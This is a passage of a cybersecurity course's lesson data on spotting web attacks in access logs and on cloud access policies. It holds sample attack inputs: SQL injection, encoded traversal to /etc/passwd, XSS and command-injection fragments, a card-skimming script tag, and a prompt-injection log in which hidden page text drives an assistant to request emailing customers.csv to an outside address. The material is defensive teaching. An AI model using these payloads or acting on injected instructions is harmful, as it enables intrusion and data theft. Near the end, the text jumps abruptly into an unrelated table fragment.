 {id:'j9',title:'Web attacks in the logs',bloom:'Analyze',sum:'Recognize injection, cross-site scripting, request forgery, path traversal, and broken access control from access logs and code, trace each to its fix, and see prompt injection as the same family.',
  can:'recognize injection, cross-site scripting, request forgery, path traversal, and broken access control in logs and code, and name the fix for each',
  blocks:[
   C('Read the web server’s diary','Analyze',
     P('Apache writes <code>/var/log/apache2/access.log</code>, nginx writes <code>/var/log/nginx/access.log</code>, and IIS writes W3C files under <code>C:\\inetpub\\logs\\LogFiles</code>. In <a href="#sophomore/s8">Web traffic, HTTPS, and certificates</a> you read one request; here you read thousands and find the few that matter.'),
     P('Kalani reads the log of makani-web, the shop’s server, in three passes: count, group by pattern, then read the lines that stand out. Five patterns cover most mornings:'),
     TIPS('<b>Scan:</b> one address asks for hundreds of different paths in seconds, and most answers are 404.',
          '<b>Guess:</b> many <code>POST /login</code> lines with the same failed answer; the app’s own log shows one account taking many passwords or many accounts one each (the spray from <a href="#sophomore/s10">Read the logs</a>).',
          '<b>Injection:</b> quotes, <code>;</code>, <code>|</code>, or <code>&lt;</code>, usually percent-encoded, inside a query.',
          '<b>Traversal:</b> <code>../</code> or its encoded forms in a file parameter.',
          '<b>Access beyond rights:</b> one signed-in account walks through record numbers, and every answer is a 200.'),
     NOTE('The status is the first clue. A 400 or 403 means a check refused the request; a 404 means nothing was served, whether a check held or the guess missed; a 500 after a quote means the input broke the query. An attack line that drew a 200 with a believable size is the line to escalate.')),
   ANATOMY('One access-log line, nine fields',[
     {name:'Combined Log Format',tag:'one request, one line',tone:'l2',grid:true,
      text:'<span class="mono">198.51.100.23 - - [20/Oct/2026:09:14:03 -1000] "GET /shop/<wbr>search?q=<wbr>kona+blend HTTP/1.1" 200 5120 "https://<wbr>kona-roasters.<wbr>example/<wbr>shop" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)…"</span>',
      children:[
       {name:'1 Client',tone:'l1',text:'198.51.100.23, the address that connected; behind a proxy, the proxy’s'},
       {name:'2 Identity',tone:'muted',text:'<code>-</code>: an old field, nearly always empty'},
       {name:'3 User',tone:'muted',text:'<code>-</code> unless the server itself asked for a password'},
       {name:'4 Time',tone:'l1',text:'Local time and offset: −1000 is HST'},
       {name:'5 Request',tone:'l3',text:'Method, path, query, and protocol: attacks show here'},
       {name:'6 Status',tone:'l3',text:'200: the outcome of the attempt'},
       {name:'7 Size',tone:'l1',text:'5120 bytes sent; an odd size on a familiar page is a clue'},
       {name:'8 Referrer',tone:'muted',text:'The page that linked here; easy to fake'},
       {name:'9 Agent',tone:'muted',text:'Browser or tool name; easy to fake, yet tools often announce themselves'}]}
   ],{label:'A combined-format access-log line split into nine fields: client, identity, user, time, request, status, size, referrer, and agent.',
     facts:{head:['Fact','How to read it'],rows:[
       ['Percent-encoding','<code>%27</code> is a quote, <code>%2e%2e%2f</code> is <code>../</code>, <code>%3C</code> is <code>&lt;</code>, and <code>%20</code> or <code>+</code> is a space. Decode before you judge a line.'],
       ['Not logged','Form bodies, cookies, and most headers. An attack in a POST body leaves only the path and status; a web application firewall (WAF) log or the app’s own log fills the gap.']]},
     key:[['l3','Where attacks show'],['l1','Who, when, and how much'],['muted','Often empty or easy to fake']],bloom:'Analyze'}),
   QUIZ('j9c1','Check yourself',[
     ['A form sends its data in the POST body. Why might the access log show nothing unusual during an attack on it?',['Access logs skip every POST request','Attacks always sit in the query string','It logs the path and status, not the body','The log rotates away before anyone reads it'],2,'The combined format leaves out bodies, cookies, and most headers; check the WAF log or the app’s own log.',{whys:['POST lines are logged; only the body is left out.','Attacks often sit in POST bodies, outside the log’s view.','The combined log format records the path, status, and size and leaves out the body, where this form’s data travels.','The body was left out from the start, whenever anyone reads the log.'],imp:'good',c:'web-access-logs'}]
   ]),
   C('Count, then read: a faded task','Analyze',
     P('The pipeline from <a href="#sophomore/s10">Read the logs</a> works on web logs unchanged: split on spaces, and the client is field 1 and the status is field 9. Kalani has run two steps; the third is yours.'),
     TERM('$ awk \'{print $1}\' access.log | sort | uniq -c | sort -rn | head -3\n   1312 203.0.113.77\n     41 198.51.100.23\n     18 192.0.2.140\n$ awk \'$1=="203.0.113.77" {print $9}\' access.log | sort | uniq -c\n   1290 404\n     21 403\n      1 200'),
     TIPS('<b>Step 1</b> ranks clients: one address made 1,312 requests overnight; real shoppers made a few dozen.',
          '<b>Step 2</b> groups that address’s answers: 1,290 misses and 21 refusals mark a scan guessing paths.',
          '<b>Step 3, yours:</b> which line do you read next, and with what filter? Decide, then open the answer.'),
     DETAIL('Step 3 answer',
       TERM('$ awk \'$1=="203.0.113.77" && $9==200\' access.log\n203.0.113.77 - - [20/Oct/2026:02:41:09 -1000] "GET /backup.zip HTTP/1.1" 200 48213377 "-" "curl/8.5.0"'),
       P('The one 200 matters most: the scan found a 48 MB backup in the web root and took it. Treat it as a data breach: save the file and its hash, move it out of the web root, learn what it held, change every password inside it, check what else 203.0.113.77 reached, and keep backups outside the web root.'))),
   C('Injection: when data turns into code','Analyze',
     P('Every injection flaw is one mistake: the app glues untrusted text into something that runs, so the text can change what runs. Every fix follows one idea: keep instructions and data apart, so input stays data.'),
     P('Here is the shop’s product search in Python, written two ways. Read it the way you read the scripts in <a href="#sophomore/s11">Scripts for defenders</a>: what goes in, and what the line does with it. In <span class="mono">SELECT columns FROM table WHERE column = \'value\'</span>, the quotes mark where data starts and stops. An f-string (<span class="mono">f"…{q}…"</span>) pastes q’s value into the SQL text before the database sees it.')),
   COMPARE('A query built from text, and a query with a parameter',[
     {name:'Built from text',tag:'an f-string',tone:'bad',rows:[
       ['Code','<span class="mono">cur.execute(f"SELECT name, price FROM products WHERE name = \'{q}\'")</span>'],
       ['Input treated as','Part of the command: the database gets one string and cannot tell the shopper’s words from the developer’s'],
       ['What a quote does','Ends the data early, so the rest runs as SQL'],
       ['Verdict','Injectable: one search box can read or change whole tables']]},
     {name:'With a parameter',tag:'a placeholder',tone:'ok',rows:[
       ['Code','<span class="mono">cur.execute("SELECT name, price FROM products WHERE name = ?", (q,))</span>'],
       ['Input treated as','A value only: the command and the data travel separately'],
       ['What a quote does','Nothing special: the database looks for a product named exactly that text, quote included, and finds none'],
       ['Verdict','Safe from injection. Parameters carry values only, so a column or sort order from input needs an allow-list. Least privilege too: the database account only reads products and writes orders']]}
   ],{intro:'<span class="mono">cur</span> is the cursor that sends the query. <span class="mono">?</span> marks a slot, and <span class="mono">(q,)</span> is a one-item tuple carrying the value separately.',
     note:'The placeholder mark varies by driver (sqlite3 <span class="mono">?</span>, others <span class="mono">%s</span>); safe means the value is a separate argument, never joined with +, %, or an f-string. Escaping quotes by hand or blocking words such as SELECT misses encoded forms; parameters close the hole by design.',bloom:'Analyze'}),
   COMPARE('One mistake, four targets',[
     {name:'SQL injection',tag:'database',tone:'l2',rows:[
       ['Input ends up in','A database query'],
       ['Tell in a log','<code>%27</code>, <code>OR 1=1</code>, <code>SLEEP(5)</code> in the query (a response-time field such as Apache’s %D, if logged, shows the delay), or a 500 after a quote'],
       ['Fix','Parameterized queries and a least-privilege database account']]},
     {name:'Command injection',tag:'shell',tone:'amber',rows:[
       ['Input ends up in','An operating-system command, such as a “ping this address” tool on a device page'],
       ['Tell in a log','<code>%3B</code> (;), <code>%7C</code> (|), <code>%26%26</code> (&amp;&amp;), backticks, or <code>$(</code> after an address. On the host, <span class="mono">sh</span> under an apache2 worker (<a href="#junior/j3">Debian and deeper Linux</a>), where a webshell looks the same'],
       ['Fix','An argument list, without a shell: <span class="mono">subprocess.run(["ping", "-c", "1", host])</span>, never <span class="mono">os.system(…)</span> or <span class="mono">shell=True</span>, which hand the string to a shell. <span class="mono">ipaddress.ip_address(host)</span> allows only addresses. Run as a low-privilege account']]},
     {name:'XSS',tag:'browser',tone:'ok',rows:[
       ['Input ends up in','A page other visitors load, where their browser runs it as JavaScript'],
       ['Tell in a log','<code>%3Cscript</code>, <code>onerror=</code>, or <code>javascript:</code> in a query or a saved comment'],
       ['Fix','Encode output for where it lands, add a CSP, and keep session cookies HttpOnly']]},
     {name:'Path traversal',tag:'file system',tone:'bad',rows:[
       ['Input ends up in','A file path the server opens'],
       ['Tell in a log','<code>../</code>, <code>%2e%2e%2f</code>, or <code>..%5c</code> in a file parameter'],
       ['Fix','An allow-list of file names, or resolve the full path and confirm it stays inside the folder']]}
   ],{note:'<b>Cross-site scripting (XSS) has three kinds:</b> stored (saved, such as a comment), reflected (bounced from a link), and DOM-based (the page’s own script inserts it). Setting <span class="mono">element.innerHTML = input</span> parses input as HTML, so markup runs; <span class="mono">element.textContent = input</span> shows plain text.',bloom:'Analyze'}),
   QUIZ('j9c2','Check yourself',[
     ['A shop on a PostgreSQL driver has <span class="mono">cur.execute("SELECT * FROM orders WHERE id = %s", (q,))</span> and <span class="mono">cur.execute("SELECT * FROM orders WHERE id = \'%s\'" % q)</span>. Which is injectable, and why?',['The second: % pastes q into the text','The first: %s always pastes text in','Both: %s is never safe in SQL','Neither: both use a placeholder'],0,'Same marks, different paths: only a separate argument keeps q as data.',{whys:['Python’s % operator pastes q into the SQL text before the database sees it, so a quote in q changes the query.','The first sends q as a separate argument, so it stays data.','The driver’s %s placeholder is safe when q travels separately.','Only the first is a placeholder; the second is Python text formatting.'],imp:'core',c:'web-secure-coding'}],
     ['Page code reads <code>results.innerHTML = "You searched for " + q</code>. Finding and fix?',['DOM-based XSS; use <code>textContent</code>','None: innerHTML is just faster','SQL injection; use a parameter','CSRF; add a token'],0,'Insert untrusted text with textContent, which never parses it as HTML.',{whys:['innerHTML parses q as markup, so a script hidden in it runs in the page, while textContent shows q as plain text.','innerHTML runs any markup in q inside the page.','q lands in the page, far from any database.','CSRF forges requests; this flaw runs script in the page.'],imp:'core',c:'web-secure-coding'}]
   ]),
   HIER('Climbing out of the web root',{name:'/  (../ 4)',tone:'muted',note:'Top of the file system',children:[
       {name:'etc',tone:'bad',note:'passwd and app configs with database passwords: outside the web root'},
       {name:'var  (../ 3)',tone:'muted',children:[
         {name:'www  (../ 2)',tone:'muted',children:[
           {name:'html: the web root  (../ 1)',tone:'ok',note:'The only area the site may serve',children:[
             {name:'files',tone:'ok',note:'Start: ?file=drill-manual.pdf'}]}]}]}]},
     {intro:'Hōkū Hardware serves manuals with <span class="mono">/download?file=drill-manual.pdf</span>, joined onto <span class="mono">/var/www/html/files/</span>. Each <code>../</code> climbs one folder: four climbs reach <code>/</code>, and <code>etc/passwd</code> walks back down.',
      note:'<b>Defense:</b> map names to an allow-list, or resolve the full path and refuse anything outside <span class="mono">/var/www/html/files</span>. Run the server as a low-privilege account so even a slip reads little. <b>In the log:</b> a 200 with a text-file size means escalate.',bloom:'Analyze'}),
   C('Signed in and allowed: two separate checks','Analyze',
     P('Kahikina High’s portal shows a student’s grades at <code>/grades?student=1041</code>. If the server checks only that a session exists, changing 1041 to 1042 shows someone else’s grades. That is <b>broken access control</b>, first on the OWASP Top 10; this form of it is an <b>insecure direct object reference (IDOR)</b>. In the log it looks calm: one account, numbers counting upward, and a 200 of similar size each time.'),
     P('The fix lives on the server: on every request, confirm the record belongs to the signed-in user (or to a teacher of that student), and answer 403 or 404 when it does not. Random ids slow guessing; only the ownership check closes the hole.')),
   PATH('A forged request, and the token that stops it',[
     {name:'Student',tag:'signed in',tone:'l1',note:'Nohea is signed in to portal.kahikina-high.example, so the browser holds its session cookie',via:'Opens a link from a chat'},
     {name:'Hostile page',tag:'another site',tone:'bad',note:'Carries a hidden form aimed at the portal’s change-email address',via:'The browser sends the form'},
     {name:'Browser',tag:'break 1',tone:'amber',note:['Sends POST /account/email to the portal','Attaches the portal cookie unless the cookie forbids it','<b>SameSite=Lax or Strict keeps the cookie off this request</b>'],via:'Arrives at the portal'},
     {name:'Portal server',tag:'break 2',tone:'ok',note:['Checks the anti-CSRF token, a secret value placed in the portal’s own forms','The hostile page cannot read it, so the request lacks it','<b>Token missing or wrong: refused with 403</b>']}
   ],{intro:'Cross-site request forgery (CSRF): another site makes your browser send a request to a site you are signed in to. The browser adds your cookie, so the request looks like yours.',
     note:'<b>XSS abuses your trust in the site</b> (its page runs a stranger’s script); <b>CSRF abuses the site’s trust in your browser</b> (it believes any request carrying your cookie). Also: change state only on POST, and ask for the password again before sensitive changes. Log tells: a state change on a GET (<span class="mono">GET /account/delete?confirm=yes</span>), or a POST whose referrer is another site.',bloom:'Analyze'}),
   C('The browser’s side: scripts and headers','Analyze',
     P('A defender asks two questions of every script on a page: <b>where does it load from</b>, and <b>where does it send data</b>? Three script tags from the Kona Hillside Roasters checkout:'),
     TERM('\u003cscript src="/js/cart.js">\n\u003cscript src="https://pay.example/v3/checkout.js">\n\u003cscript src="https://cdn-kona-roasters.example/stats.js">   (added 18 Oct; posts card fields to its own host)'),
     P('The first is the shop’s own and the second is its payment provider’s. The third is a skimmer: a look-alike host the shop never chose, sending form fields away. The headers from <a href="#sophomore/s8">Web traffic, HTTPS, and certificates</a> blunt this unit’s attacks: <code>content-security-policy: script-src \'self\' https://pay.example</code> refuses the third script and inline injected ones, HttpOnly keeps the session cookie from scripts, SameSite blunts CSRF, and <code>frame-ancestors \'none\'</code> stops framing tricks.')),
   C('Decode before you judge','Analyze',
     P('Intruders disguise input so filters and tired readers miss it: percent-encoding characters that never need it (<code>%2e</code> for a dot), encoding twice (<code>%252e</code> becomes <code>%2e</code>, then a dot), mixed case, and base64 blobs in a parameter. Obfuscation is itself a warning sign, since real shoppers never type <code>%2e%2e%2f</code>. Decode the copied text with a tool that only prints:'),
     TERM('$ python3 -c "from urllib.parse import unquote_plus; print(unquote_plus(\'%2e%2e%2f%2e%2e%2fetc%2fpasswd\'))"\n../../etc/passwd\n$ echo \'Li4vLi4vZXRjL3Bhc3N3ZA==\' | base64 -d\n../../etc/passwd'),
     P('<span class="mono">unquote_plus</span> also turns + into a space, as a query string means it. Decoding prints text and runs nothing. Work on your own machine, and never paste a decoded command into a shell.')),
   HIER('One app, many packages',{name:'Shop app',tone:'l4',note:'Kona Hillside Roasters, three direct packages',children:[
       {name:'flask 3.0.3',tone:'l3',note:'direct',children:[{name:'werkzeug',tone:'l2',note:'nested'},{name:'jinja2',tone:'l2',note:'nested',children:[{name:'markupsafe',tone:'l1',note:'nested twice'}]}]},
       {name:'requests 2.32.3',tone:'l3',note:'direct',children:[{name:'urllib3 1.26.4',tone:'bad',note:'nested: a flaw here reaches the app'},{name:'idna',tone:'l2',note:'nested'}]},
       {name:'pillow 10.4.0',tone:'l3',note:'direct'}]},
     {intro:'Most of a web app is other people’s code from registries such as PyPI (pip) and npm, and each package brings its own. The app never imports urllib3, yet its flaw runs inside the app.',
      note:'<b>Risks:</b> a known vulnerable version, a look-alike (typosquatted) name, and a hijacked package that ships a bad update. <b>Defenses:</b> a lock file with exact versions and hashes, an audit in every build (<code>pip-audit</code> or <code>npm audit</code>), a software bill of materials (SBOM) that lists every package, and signed releases.',bloom:'Analyze'}),
   DETAIL('When the data gives orders: prompt injection',
     P('An AI assistant reads instructions and data as one stream of text. <b>Prompt injection</b> is text the model follows as instructions when it should treat it as data. <b>Direct</b> injection is typed into the chat to override its rules. <b>Indirect</b> injection hides in a page, email, or file the assistant reads; it is the more dangerous kind, because the user never sees it. That is the injection family again: untrusted text treated as instructions. Kalani asks the shop’s assistant to summarize a supplier newsletter, and its activity log reads:'),
     TERM('10:02:14  read newsletter.html (hidden text found)\n10:02:15  tool request: send_email to orders@outside.example, attach customers.csv\n10:02:15  held: waiting for user confirmation\n10:02:31  denied by kalani'),
     P('Two defenses limit the harm: give the assistant <b>least-privilege tools</b> (read this folder, never send mail), and have <b>a person confirm</b> any action with consequences. Treat model output as untrusted input too: it never goes straight into a shell, a query, or a page. What to paste in the first place: <a href="#freshman/f2">Safe and ethical online</a>.')),
   SPOT('j9sp','Tag the access-log lines','Kahikina High’s portal app log, trimmed to client, account (- for none), time (HST), request, status, and size. Each student’s own id: nohea 1041, kekoa 1077, kai 1062; 192.0.2.10 is the school’s uptime monitor. Tap every line that shows misuse; each answer names its tag: scan, guess, injection, traversal, or access beyond rights. Then Check.',[
     ['192.0.2.140 nohea 07:58:12 "GET /grades?student=1041" 200 3812',null],
     ['203.0.113.77 - 08:02:01 "GET /wp-login.php" 404 196','Scan: a path this portal never had, one of hundreds from this address in a minute.'],
     ['203.0.113.77 - 08:02:01 "GET /.env" 404 196','Scan: probing for a settings file full of secrets. The 404 means the probe missed.'],
     ['198.51.100.23 - 08:10:44 "POST /login" 401 412   (x58 in 2 min, 58 different usernames)','Guess: one try per account across many accounts, a password spray. Rate-limit by address and alert.'],
     ['192.0.2.141 kekoa 08:15:30 "GET /grades?student=1077" 200 3790',null],
     ['198.51.100.60 - 08:20:13 "GET /search?q=chem%27%20OR%201%3D1--" 500 2210','Injection (SQL): a decoded quote and OR 1=1, and the 500 says the query broke. Parameterize the search.'],
     ['198.51.100.60 - 08:21:40 "GET /news?q=%3Csvg%20onload%3D…" 200 2033','Injection (XSS): markup in the query. Check that the page encodes it before showing it.'],
     ['203.0.113.91 - 08:31:02 "GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd" 200 1873','Traversal, and the 200 with a text-file size says it worked: escalate now.'],
     ['192.0.2.150 kai 08:39:58 "GET /grades?student=1062" 200 3802',null,'Kai’s own id is 1062, so this is his own grades page. The walk starts on the next line.'],
     ['192.0.2.150 kai 08:40:01 "GET /grades?student=1063" 200 3795','Access beyond rights: kai, who is 1062, now reads 1063, and the server says yes.'],
     ['192.0.2.150 kai 08:40:03 "GET /grades?student=1064" 200 3821','Access beyond rights: the walk continues, every answer a 200. Add the ownership check.'],
     ['192.0.2.142 healani 08:45:10 "POST /account/email" 200 520',null,'Healani is signed in and changes her own account’s email: one request, from her own session, to her own page.'],
     ['203.0.113.88 - 09:02:11 "GET /tools/ping?host=192.0.2.1%3B…" 200 640','Injection (command): %3B is a semicolon after the address. Allow an IP address and nothing else.'],
     ['192.0.2.10 - 09:05:00 "HEAD /login" 200 0',null,'192.0.2.10 is the school’s uptime monitor, and a HEAD request with a 0-byte answer is its routine check.']
   ]),
   MATCH('j9m','Attack to its fix','Tap an attack on the left, then the fix that closes it.',[
     ['A quote in the search box breaks the query','Parameterized query','The command and the data travel separately, so input stays data.'],
     ['A semicolon after the address in a ping tool','Call the program without a shell; allow only an IP address','With no shell, a semicolon is just a character.'],
     ['A saved comment runs script for every visitor','Encode output for its context, plus a CSP','Encoded markup shows as text; the CSP refuses scripts from elsewhere.'],
     ['../ in a download parameter','An allow-list of file names, or a full-path check','The resolved path must stay inside the served folder.'],
     ['Sequential ids return other students’ grades','A server-side ownership check on every request','Signing in and being allowed are two separate checks.'],
     ['Another site makes your browser change your email','An anti-CSRF token plus SameSite cookies','XSS abuses your trust in the site; CSRF abuses the site’s trust in your browser.'],
     ['Hidden instructions in a page an AI assistant summarizes','Least-privilege tools, a person confirms actions, and model output stays untrusted','Prompt injection is injection: untrusted text treated as instructions.'],
     ['A nested package with a known flaw','Update or pin it in the lock file, and audit every build','A flaw deep in the tree still runs inside the app.']
   ],'Analyze'),
   QUIZ('j9q','Check: web attacks',[
     ['A line reads <code>"GET /download?file=..%2f..%2f..%2fetc%2fpasswd" 400 226</code>. What happened?',['The password file was downloaded in full','A traversal attempt the server refused','A scan for pages that are missing','A normal download of a manual'],1,'Decode first, then read the status: a 200 with a text-file size would mean escalate.',{whys:['A 400 is a refusal; a download shows a 200 and a file-sized answer.','%2f decodes to /, so the parameter tries to climb out of its folder, and the 400 shows the server refused it.','A scan asks for many paths; this is one file parameter climbing out.','A real manual request names a file, without any ../.'],imp:'core',c:'web-access-logs'}],
     ['One address sends <code>POST /login</code> 300 times, each answered 401 with 412 bytes, then once with 302 and 0 bytes. Best reading?',['Normal use by a forgetful user','A scan for missing paths on the site','Guessing that likely worked at the end','Command injection in the sign-in form'],2,'Failed sign-ins repeat one answer, so check the account behind the one that differs.',{whys:['A forgetful user tries a few times, far short of 300.','A path scan asks for many paths; this is one path, repeated.','Three hundred identical failures followed by one different answer, a redirect into the site, mark a guess that likely worked.','Command injection shows ; or | in the request; these are plain sign-ins.'],imp:'core',c:'web-access-logs'}],
     ['A device page runs <code>os.system("ping -c 1 " + host)</code>. Which attack does this allow, and what fixes it?',['XSS; encode the output for the HTML page','SQL injection; use query parameters','Nothing: ping only reads the network','Command injection; use an argument list'],3,'An argument list keeps host one argument; <code>ipaddress.ip_address(host)</code> confirms it is an address.',{whys:['XSS runs in a browser; this string runs in a shell.','The input reaches a shell command, with no database involved.','A ; in host starts a second command of the intruder’s choice.','os.system hands the whole string to a shell, which obeys ; or |, while an argument list keeps host one value that no shell reads.'],imp:'core',c:'web-secure-coding'}],
     ['<code>pip-audit</code> flags urllib3, which the shop never imports itself. Should Kalani care?',['No: only direct packages ever run','Only if the site has no CSP header','Only when the server runs Windows','Yes: nested packages run in the app'],3,'Update its direct parent or pin the fixed version in the lock file.',{whys:['Nested packages load into the app and run with its rights.','CSP limits browser scripts; this flaw sits in server code.','Packages run the same on Windows and Linux.','urllib3 loads into the app through requests and runs with the app’s rights, so its flaw is the shop’s flaw.'],imp:'good',c:'web-owasp'}],
     ['The shop assistant’s log shows <span class="mono">read newsletter.html (hidden text found)</span>, a tool request to email customers.csv to an outside address, then <span class="mono">held: waiting for user confirmation</span>. Where did the instructions come from, and what held?',['Kalani typed them; the firewall held','Direct injection; the model refused','Hidden text in the page; a person confirms','The CSV file; antivirus held'],2,'Hidden orders in a page the assistant reads are indirect injection.',{whys:['Kalani asked only for a summary, and the email order came from elsewhere.','Direct injection is typed into the chat; this text hid in the page.','Kalani asked only for a summary, so the email order came from hidden text in the page, and the rule that a person confirms each action with consequences stopped the send.','The CSV was the file to steal, and the confirmation rule held.'],imp:'good',c:'threat-ai-tools'}],
     ['The portal’s cookie is <code>Set-Cookie: session=…; Secure; HttpOnly</code>. Which attack from this unit does the missing flag leave more open?',['SQL injection','Path traversal','A port scan','CSRF'],3,'Add SameSite=Lax so other sites’ requests arrive without the cookie. <a href="#sophomore/s8">Review: Web traffic, HTTPS, and certificates</a>',{whys:['SQL injection rides on queries, apart from cookie flags.','Path traversal abuses a file parameter, and the SameSite flag plays no part in it.','A port scan probes ports, far from any cookie.','SameSite is the missing flag, and until it is set, requests that other sites start still carry the cookie, which is what CSRF needs.'],imp:'good',c:'web-http'}],
     ['Kalani counts requests per client with <code>awk \'{print $1}\' access.log | sort | uniq -c | sort -rn</code>. Why does sort come before <code>uniq -c</code>?',['sort removes the duplicate lines first','uniq -c needs numbers in order','uniq -c counts only neighboring lines','It colors the output for reading'],2,'Sort, then count, then rank. <a href="#sophomore/s10">Review: Read the logs</a>',{whys:['uniq -c merges repeats; sort only orders the lines.','uniq -c compares text lines, whatever their numbers.','uniq -c merges only duplicates that sit next to each other, so sort first groups equal addresses together.','Both commands print plain text.'],imp:'good',c:'lin-shell'}]
   ]),
   LINKS('Go further',['owasp10','owasp-sqli','owasp-csrf','owasp-llm','juice'])
   ]},
 {id:'j10',title:'Cloud security: identity, storage, and logs',bloom:'Analyze',sum:'Read cloud policies, storage settings, network rules, container recipes, and audit logs from realistic excerpts, see who decides access, and find the misconfiguration before an attacker does.',
  can:'read a cloud policy, a storage setting, a network rule, a container recipe, and an audit log, and find the misconfiguration before an attacker does',
  blocks:[
   C('Every click is an API call','Analyze',
     P('A cloud console is a web page in front of an API. Every click or script is a signed API call the provider can log: who called, what, from where, and whether it worked. Valid credentials reach the console from anywhere, so <b>identity is the new perimeter</b>.'),
     P('From <a href="#freshman/f11">The web and the cloud in plain words</a>: the provider secures buildings, hardware, and the hypervisor. The customer secures identities, data, and settings, plus each VM’s operating system on IaaS, where every hardening skill from this course still applies. Most cloud breaches start on the customer’s side: public storage, keys leaked in code, accounts without MFA, and permissions far wider than the job.')),
   DETAIL('Provider names, S3 defaults, and Google Cloud inheritance',
   COMPARE('Three providers, one vocabulary',[
     {name:'AWS',tag:'Amazon Web Services',tone:'l1',rows:[['Identity','IAM users, roles, and policies'],['Object storage','S3 buckets'],['Virtual machines','EC2'],['Network filtering','Security groups and network ACLs'],['Audit log','CloudTrail'],['Functions','Lambda']]},
     {name:'Azure',tag:'Microsoft',tone:'l2',rows:[['Identity','Microsoft Entra ID with Azure RBAC'],['Object storage','Blob Storage'],['Virtual machines','Virtual Machines'],['Network filtering','Network security groups (NSGs)'],['Audit log','Activity Log and Entra sign-in logs'],['Functions','Azure Functions']]},
     {name:'Google Cloud',tag:'Google',tone:'l3',rows:[['Identity','Cloud IAM'],['Object storage','Cloud Storage buckets'],['Virtual machines','Compute Engine'],['Network filtering','VPC firewall rules'],['Audit log','Cloud Audit Logs'],['Functions','Cloud Run functions']]}
   ],{intro:'Learn each job once; only the product names change.',
     note:'New S3 buckets block public access by default (since April 2023), so a newer public bucket means someone turned that block off. Google Cloud grants roles at the organization, folder, or project level, and each grant flows down to everything below it, like NTFS inheritance.',
     bloom:'Analyze'})),
   C('One bucket policy statement','Analyze',
     P('Pua opens the policy on lehua-clinic-forms, an S3 bucket (AWS object storage):'),
     TERM('{\n  "Effect": "Allow",\n  "Principal": "*",\n  "Action": "s3:GetObject",\n  "Resource": "arn:aws:s3:::lehua-clinic-forms/*"\n}'),
   ANATOMY('Its five parts',[
     {name:'Statement',tag:'lehua-clinic-forms bucket policy',tone:'l2',children:[
       {name:'Effect',tag:'"Allow"',tone:'l1',text:'Allow or Deny'},
       {name:'Principal',tag:'"*"',tone:'bad',text:'Who. <code>"*"</code> means anyone on the internet, signed in or not'},
       {name:'Action',tag:'"s3:GetObject"',tone:'l1',text:'What: download an object'},
       {name:'Resource',tone:'l1',text:'Which bucket and objects; <code>/*</code> means every object'},
       {name:'Condition',tag:'optional',tone:'muted',text:'When: for example only from one network (<span class="mono">aws:SourceIp</span>) or only over TLS (<span class="mono">aws:SecureTransport</span>)'}]}
   ],{intro:'Read a statement as a sentence: Allow anyone to download every patient form in the Hilo Lehua Clinic bucket.',
     facts:{head:['Rule','Meaning'],rows:[
       ['Two kinds of policy','Identity policies attach to a user or role and have no Principal; resource policies attach to the bucket and name who.'],
       ['Evaluation','Default deny; any explicit Deny wins over every Allow.']]},
     note:'Fix: name the one role that needs the forms, keep Block Public Access on, and log every read.',bloom:'Analyze'})),
   QUIZ('j10c1','Check yourself',[
     ['A bucket policy allows <code>s3:GetObject</code> for the forms-reader role, and another statement denies every request where <code>aws:SecureTransport</code> is false. The role asks over plain HTTP. Result?',['Denied: an explicit Deny wins','Allowed: the role is named','Allowed, with a warning','Denied only for anonymous users'],0,'Default deny; Allows open doors, and any explicit Deny closes them again, whatever the Allows say.',{whys:['An explicit Deny overrides every Allow, and this request arrived without TLS, so the Deny applies.','The Allow names the role, yet the Deny still covers plain HTTP.','Policies allow or deny, without warnings.','The Deny covers every request without TLS, named roles included.'],imp:'core',c:'cloud-iam-storage'}],
     ['A policy has Effect, Action, and Resource but no Principal. Where is it attached?',['To a bucket','To a user or role','To a security group','To the audit log'],1,'Resource policies, such as bucket policies, name who; identity policies already sit on the who.',{whys:['Bucket policies are resource policies, so they name a Principal.','An identity policy attaches to a user or role, which already is the who, so it leaves out the Principal.','Security groups hold network rules, apart from policy statements.','Audit logs record calls; policies attach to identities and resources.'],imp:'good',c:'cloud-iam-storage'}]
   ]),
   COMPARE('Who decides access',[
     {name:'DAC',tag:'discretionary',tone:'l1',rows:[['Who decides','Each file’s owner'],['DL example','<code>chmod 600</code> on <code>~/.ssh/authorized_keys</code> (<a href="#sophomore/s3">Debian-family hardening</a>)'],['Weak spot','Owners over-share, and any program running as the owner gets the owner’s reach']]},
     {name:'MAC',tag:'mandatory, not a MAC address',tone:'l2',rows:[['Who decides','A central policy the owner cannot override'],['DL example','An AppArmor profile confining a service, root included (<a href="#junior/j3">Debian and deeper Linux</a>)'],['Weak spot','Hard to write; a profile left in complain mode only logs']]},
     {name:'RBAC',tag:'role-based',tone:'l3',rows:[['Who decides','Admins grant rights to roles, then people to roles'],['DL example','The Domain Admins group (<a href="#junior/j1">Windows Server and Active Directory</a>), or an Azure RBAC role'],['Weak spot','Role creep: people keep old roles as they move']]},
     {name:'ABAC',tag:'attribute-based',tone:'l4',rows:[['Who decides','Rules on attributes of the user, the resource, and the request'],['DL example','A policy Condition: only from the clinic network, only over TLS'],['Weak spot','Hard to read and test; a careless rule can allow when an attribute is missing']]}
   ],{note:'In AWS, a <b>role</b> is also an identity that a program or person takes on for short-lived credentials; its policy plays the part of an RBAC role.',
     caption:'Owner, central policy, role, or attributes: name who decides, then look for that model’s weak spot.',bloom:'Analyze'}),
   C('Narrow a policy: a faded task','Analyze',
     P('Pua manages the Hilo Lehua Clinic cloud account. The nightly backup job runs as an identity with this policy and a long-lived access key in its settings file:'),
     TERM('{\n  "Effect": "Allow",\n  "Action": "*",\n  "Resource": "*"\n}'),
     TIPS('<b>Done for you:</b> the job only writes backup files, so Action narrows to <code>"s3:PutObject"</code>.',
          '<b>Your turn:</b> narrow Resource, then name what replaces the long-lived key. Decide, then open the answer.'),
     DETAIL('Answer',
       P('Resource becomes <code>"arn:aws:s3:::lehua-clinic-backups/*"</code>, one bucket’s objects. The job runs as a <b>role</b> attached to its server or function, which hands out short-lived credentials, so no key sits in a file to leak. <code>"Action": "*"</code> on <code>"*"</code> is the cloud’s version of putting a service in Domain Admins.'))),

       ['When no rule matches','The default you set: deny incoming here'],
       ['Return traffic','Automatic']]},
     {name:'Security group',tag:'cloud VM',tone:'l3',rows:[
       ['The rules','Inbound: <span class="mono">HTTPS TCP 443 0.0.0.0/0</span><br><span class="mono">SSH TCP 22 10.1.20.0/24</span> (over the site VPN)'],
       ['Applies to','Each VM network interface it is attached to'],
       ['Rule order','None: any allow rule that matches lets it in'],
       ['Stateful?','Yes; allow rules only'],
